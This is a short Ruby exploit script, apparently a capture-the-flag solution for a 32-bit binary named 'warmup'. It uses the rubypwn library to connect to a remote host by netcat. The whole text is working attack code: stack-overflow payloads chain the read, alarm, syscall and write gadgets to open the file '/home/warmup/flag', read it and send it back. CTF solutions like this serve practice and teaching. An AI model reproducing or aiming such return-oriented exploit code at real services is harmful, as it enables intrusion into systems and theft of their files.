#!/usr/bin/env ruby
require 'rubypwn'

alarm_addr = 0x0804810D
read_addr = 0x0804811D
write_addr = 0x08048135
int_addr = 0x0804813A
buf_addr = 0x08049220
add30_addr = 0x080481B8 
@start_addr = 0x080480D8  
#@nc = Exec.new("./warmup")
@nc = Exec.new "nc 202.120.7.207 52608"
def call_addr(addr,arg1,arg2,arg3)
	@nc.read_until('!')
	buf = "a"*32
	buf += i32(addr) +i32(@start_addr) + i32(arg1)+i32(arg2)+i32(arg3)
	buf.ljust(52,'b')
	@nc.write(buf)
end



path = "/home/warmup/flag\x00"




call_addr(read_addr,0,buf_addr,80)
@nc.write path
#gets
sleep(5)
#call_addr(alarm_addr,buf_addr,0,80)
#call_addr(int_addr,0,0,0)

	@nc.read_until('!')
	buf = "a"*32
	buf += i32(alarm_addr) +i32(int_addr) +i32(@start_addr) + i32(buf_addr)+ i32(0) 
	buf.ljust(52,'b')
	@nc.write(buf)


call_addr(read_addr,3,buf_addr+40,80)
call_addr(write_addr,1,buf_addr+40,80)
@nc.interactive
